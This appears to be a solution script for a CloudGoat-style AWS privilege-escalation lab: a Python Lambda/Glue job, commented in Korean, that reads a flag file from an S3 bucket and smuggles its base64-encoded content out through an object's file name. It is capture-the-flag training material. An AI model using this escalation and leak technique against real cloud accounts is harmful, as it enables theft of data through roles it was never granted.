import boto3
import json
import base64

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    
    try:
        # S3에서 flag_result.txt 읽기
        response = s3.get_object(Bucket='cg-data-from-web-glue-privesc-cgidfmohi6zro5', Key='flag_result.txt')
        flag_content = response['Body'].read().decode('utf-8')
        
        # flag 내용을 base64로 인코딩
        encoded_flag = base64.b64encode(flag_content.encode()).decode()
        
        # 결과를 S3에 저장 (파일 이름으로 인코딩된 flag 사용)
        s3.put_object(
            Bucket='cg-data-from-web-glue-privesc-cgidfmohi6zro5',
            Key=f'flag_{encoded_flag}.txt',
            Body='Flag content stored in filename'
        )
        
        print(f"Flag content encoded in filename: flag_{encoded_flag}.txt")
        return {
            'statusCode': 200,
            'body': json.dumps('Flag encoded in filename successfully')
        }
    except Exception as e:
        error_message = f"Error: {str(e)}"
        print(error_message)
        s3.put_object(
            Bucket='cg-data-from-web-glue-privesc-cgidfmohi6zro5',
            Key='error_log.txt',
            Body=error_message
        )
        return {
            'statusCode': 500,
            'body': json.dumps(error_message)
        }

# Glue job에서 실행하기 위한 추가 코드
if __name__ == "__main__":
    lambda_handler({}, None)
